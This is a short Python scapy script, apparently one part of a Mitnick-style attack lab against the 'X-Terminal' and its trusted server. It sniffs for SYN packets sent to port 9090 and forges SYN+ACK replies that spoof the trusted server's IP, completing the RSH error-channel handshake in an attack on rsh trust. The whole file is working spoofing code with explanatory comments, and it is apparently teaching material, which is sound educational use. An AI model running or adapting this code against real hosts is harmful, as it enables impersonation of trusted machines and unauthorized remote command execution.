#!/usr/bin/python3
from scapy.all import *
import config

# The port specified in the RSH payload ('9090\x00seed...')
ERROR_PORT = 9090

def handle_error_conn(pkt):
    # Look for a SYN packet aimed at the Error Port
    if pkt.haslayer(TCP) and pkt[TCP].flags == 'S':
        print(f"[+] Connection 2 (Error): Received SYN from {pkt[IP].src}")
        
        # Construct the SYN+ACK response
        
        # IP Layer: impersonating Trusted Server
        ip = IP(src=config.TRUSTED_SERVER_IP, dst=config.X_TERMINAL_IP)
        
        # TCP Layer:
        # sport: must be 9090 (the port I told X-Terminal to contact)
        # dport: the random port X-Terminal chose to send the SYN from
        # flags: 'SA' (SYN+ACK)
        # ack: the received Sequence Number sniffed + 1
        # seq: realistic sequence number (continuing from trigger logic)
        tcp = TCP(sport=ERROR_PORT, dport=pkt[TCP].sport, flags='SA', 
                  seq=779000000, ack=pkt[TCP].seq + 1)
        
        print(f"[+] Connection 2 (Error): Sending SYN+ACK...")
        send(ip/tcp, verbose=0)
        
        # Handshake completed. X-Terminal now considers the error channel valid.

# Filter: capture only SYN packets going to the Trusted Server IP on port 9090
my_filter = f"tcp and dst host {config.TRUSTED_SERVER_IP} and dst port {ERROR_PORT}"

print(f"[*] Sniffing started... Filter: {my_filter}")
sniff(iface=config.IFACE, filter=my_filter, prn=handle_error_conn)
